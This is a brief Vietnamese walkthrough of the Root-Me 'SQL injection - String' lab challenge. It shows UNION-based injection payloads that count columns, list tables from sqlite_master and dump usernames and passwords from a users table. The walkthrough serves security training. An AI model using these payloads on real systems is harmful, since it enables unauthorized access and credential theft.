## Link challenge: [SQL injection](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-String)

Ta sẽ thực hiện sql injection ở chức năng `Search`. Vào ô search nhận thấy trả về kết quả gồm hai cột, check bằng

`' UNION SELECT NULL,NULL--`
=> Không trả về lỗi => 2 cột

Giờ cần tìm table mình cần lấy thông tin thông qua `sqlite_master`

`'union select name, sql from sqlite_master--`

![img1](https://i.imgur.com/FzvmzCg.png)

Thấy có bảng users lưu thông tin accounts, ta có:

`' UNION SELECT username,password from users--`

![img2](https://i.imgur.com/pMz8jz4.png)

Thành công lấy được username và password của admin :v